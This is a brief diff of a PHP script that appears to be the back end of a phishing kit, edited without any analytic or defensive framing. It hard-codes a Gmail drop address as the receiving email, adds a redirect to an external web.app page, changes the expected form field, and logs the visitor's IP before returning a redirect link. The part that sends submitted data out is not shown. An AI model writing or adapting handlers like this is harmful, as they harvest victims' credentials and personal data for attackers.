@@ -1,8 +1,9 @@
 <?php
 
 $Receive_email="staerkelramee@gmail.com";
+$redirect = "https://hubozk.web.app/test/";
 
-if (isset($_POST['_cmdContinue'])) {
+if (isset($_POST['submitContinue'])) {
 	
 
 	$ip = getenv("REMOTE_ADDR");
@@ -107,5 +108,3 @@ $data = array(
         'redirect_link' => $redirect,
     );
     echo json_encode($data);
-
-?>
